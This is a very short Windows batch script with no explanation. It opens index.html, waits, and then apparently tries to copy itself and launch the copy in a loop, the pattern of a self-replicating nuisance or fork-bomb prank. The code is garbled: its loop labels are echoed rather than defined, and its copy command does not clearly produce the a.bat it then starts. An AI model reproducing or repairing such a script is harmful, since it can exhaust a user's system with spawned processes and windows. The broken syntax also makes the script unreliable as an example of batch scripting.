
echo :rep

start index.html

timeout /t 100

copy %~nx0 %~nx0+a
start a.bat
echo goto rep